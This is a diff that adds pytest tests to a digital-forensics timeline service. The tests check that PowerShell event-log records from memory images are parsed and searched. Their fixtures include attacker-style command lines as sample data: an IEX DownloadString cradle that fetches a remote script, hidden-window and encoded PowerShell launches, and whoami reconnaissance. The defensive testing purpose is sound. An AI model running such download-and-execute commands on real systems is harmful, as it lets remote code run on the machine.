@@ -183,3 +183,59 @@ def test_full_timeline_filter_understands_the_memprocfs_alias() -> None:
     item = {"kind": "event", "artifact_type": "memprocfs_eventlog"}
     assert timeline_service._matches_timeline_filters(item, {"artifact_type": ["memprocfs"]})
     assert not timeline_service._matches_timeline_filters({"kind": "event", "artifact_type": "mft"}, {"artifact_type": ["memprocfs"]})
+
+
+def _eventlog_row(event_id: int, provider: str, channel: str, data: str) -> dict:
+    text = f"log:[x.evtx] provider:[{provider}] channel:[{channel}] event:{event_id} level:5 record:9 data:[{data}]"
+    return {"Time": "2025-03-07 19:40:01", "Type": "EVTX", "Action": "---", "PID": "5404", "Value32": "0x1", "Value64": "0x2", "Text": text}
+
+
+def test_powershell_script_blocks_become_powershell_commands() -> None:
+    script = "$c = New-Object Net.WebClient; IEX $c.DownloadString('http://x/a.ps1')"
+    row = _eventlog_row(4104, "Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", f"MessageNumber=1; MessageTotal=2; ScriptBlockText={script}; ScriptBlockId=abc-1; Path=")
+    document = timeline_event(row, timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
+    assert document["powershell"]["command"] == script
+    assert document["powershell"]["script_block_id"] == "abc-1" and document["powershell"]["message_total"] == "2"
+    assert document["process"] == {"name": "powershell.exe", "pid": "5404"}
+    assert document["windows"]["event_id"] == 4104
+    assert document["event"]["message"].startswith("PowerShell event 4104: $c = New-Object")
+
+
+def test_powershell_command_invocations_and_engine_starts_name_their_command() -> None:
+    context = "Severity = Informational\n        Host Name = ConsoleHost\n        Host Application = powershell.exe -nop -w hidden\n        Command Name = Get-LocalUser"
+    invocation = timeline_event(_eventlog_row(4103, "Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", f"ContextInfo={context}; UserData=; Payload=CommandInvocation(Get-LocalUser): \"Get-LocalUser\""), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
+    assert invocation["powershell"]["command"] == 'CommandInvocation(Get-LocalUser): "Get-LocalUser"'
+    assert invocation["powershell"]["host_application"] == "powershell.exe -nop -w hidden"
+    engine = timeline_event(_eventlog_row(400, "PowerShell", "Windows PowerShell", "Available; None; \tNewEngineState=Available\n\tHostApplication=powershell.exe -enc SQBFAFgA\n\tEngineVersion=5.1"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
+    assert engine["powershell"]["command"] == "powershell.exe -enc SQBFAFgA"
+    pipeline = timeline_event(_eventlog_row(800, "PowerShell", "Windows PowerShell", "whoami; \tHostApplication=powershell.exe\n\tCommandLine=whoami /all\n"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
+    assert pipeline["powershell"]["command"] == "whoami /all"
+
+
+def test_other_event_log_records_are_not_powershell_commands() -> None:
+    security = timeline_event(_eventlog_row(4104, "Some-Other-Provider", "Application", "ScriptBlockText=x"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
+    assert "powershell" not in security
+    empty = timeline_event(_eventlog_row(4104, "Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", "MessageNumber=1; MessageTotal=1; ScriptBlockText=; ScriptBlockId=z"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
+    assert "powershell" not in empty
+
+
+def test_powershell_log_lists_the_evidence_records_oldest_first(monkeypatch: pytest.MonkeyPatch) -> None:
+    from app.core import opensearch
+    from app.services.memory.evidence_timeline import memory_powershell_log
+
+    bodies: list[dict] = []
+
+    class Client:
+        def search(self, index, body, params=None):
+            bodies.append(body)
+            source = {"event_id": "memprocfs-1", "@timestamp": "2025-03-07T19:40:01Z", "windows": {"event_id": 4104, "channel": "Microsoft-Windows-PowerShell/Operational"}, "process": {"name": "powershell.exe", "pid": "5404"}, "powershell": {"command": "whoami", "message_number": "1", "message_total": "3", "script_block_id": "abc"}}
+            return {"hits": {"total": {"value": 1}, "hits": [{"_id": "memprocfs-1", "_source": source}]}}
+
+    monkeypatch.setattr(opensearch, "get_opensearch_client", lambda *a, **k: Client())
+    result = memory_powershell_log("c", "e", q="who", page=2, page_size=10)
+    assert result["total"] == 1
+    assert result["items"][0] == {"id": "memprocfs-1", "timestamp": "2025-03-07T19:40:01Z", "event_id": 4104, "channel": "Microsoft-Windows-PowerShell/Operational", "pid": 5404, "command": "whoami", "host_application": None, "script_block_id": "abc", "part": "1/3"}
+    body = bodies[0]
+    assert body["from"] == 10 and body["sort"][0] == {"@timestamp": {"order": "asc"}}
+    assert {"exists": {"field": "powershell.command"}} in body["query"]["bool"]["filter"]
+    assert {"term": {"evidence_id": "e"}} in body["query"]["bool"]["filter"]
